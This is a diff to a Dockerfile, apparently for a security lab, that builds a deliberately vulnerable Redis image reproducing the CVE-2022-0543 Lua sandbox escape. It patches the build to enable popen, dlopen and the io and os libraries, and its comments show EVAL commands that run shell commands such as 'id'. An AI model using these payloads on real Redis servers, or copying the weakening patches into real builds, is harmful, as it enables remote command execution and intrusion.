@@ -4,19 +4,19 @@
 # CVE-2022-0543: Lua sandbox escape via package.loadlib (reproduced by patches below)
 #
 # This image patches Redis's Lua sandbox to reproduce the CVE-2022-0543 condition:
-#   1. Enables package.loadlib's dlopen() backend in bundled Lua
+#   1. Enables dlopen() + popen() in bundled Lua (LUA_USE_DLOPEN, LUA_USE_POPEN)
 #   2. Loads the package, io, and os standard libraries into the sandbox
-#   3. Disables the globals allow-list protection
+#   3. Disables the globals allow-list protection (__newindex filter)
 #
 # With these patches, an attacker can escape the Lua sandbox via:
-#   EVAL 'local io=package.loadlib("/usr/lib/.../liblua5.1.so.0","luaopen_io")(); ...'
+#   EVAL "local f = io.popen('id'); return f:read('*a')" 0
 #
 # Build:
 #   docker build -f Dockerfile.redis-vulnerable -t ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10 .
 #
-# Test sandbox escape manually:
-#   redis-cli EVAL 'return tostring(package)' 0
-#   redis-cli EVAL 'return tostring(package.loadlib)' 0
+# Test sandbox escape:
+#   redis-cli EVAL 'return tostring(io)' 0           → table: 0x...
+#   redis-cli EVAL "return io.popen('id'):read('*a')" 0  → uid=999(redis) ...
 
 FROM debian:bookworm-slim AS builder
 
@@ -32,14 +32,17 @@ RUN curl -fsSL https://github.com/redis/redis/archive/7.2.10.tar.gz \
     | tar xz --strip-components=1
 
 # ---------------------------------------------------------------------------
-# Patch 1: Enable dlopen() in the bundled Lua interpreter.
+# Patch 1: Enable dlopen() and popen() in the bundled Lua interpreter.
 #
-# Redis bundles its own Lua 5.1. By default it's compiled without
-# LUA_USE_DLOPEN, so package.loadlib is a stub that always fails.
-# Adding this flag makes loadlib use dlopen() — the prerequisite for
-# CVE-2022-0543.
+# Redis bundles its own Lua 5.1. By default it's compiled with -DLUA_ANSI
+# which does NOT include dlopen or popen support. Redis's deps/Makefile
+# overrides CFLAGS on the make command line, so we must patch deps/Makefile
+# (not deps/lua/src/Makefile) to add -DLUA_USE_DLOPEN and -DLUA_USE_POPEN.
+#
+# -DLUA_USE_DLOPEN → enables package.loadlib() via dlopen (CVE-2022-0543)
+# -DLUA_USE_POPEN  → enables io.popen() in the bundled io library
 # ---------------------------------------------------------------------------
-RUN sed -i '/^CFLAGS/s/$/ -DLUA_USE_DLOPEN/' deps/lua/src/Makefile
+RUN sed -i 's/-DLUA_ANSI/-DLUA_ANSI -DLUA_USE_DLOPEN -DLUA_USE_POPEN/' deps/Makefile
 
 # ---------------------------------------------------------------------------
 # Patch 2: Load the package and os libraries into the Lua sandbox.
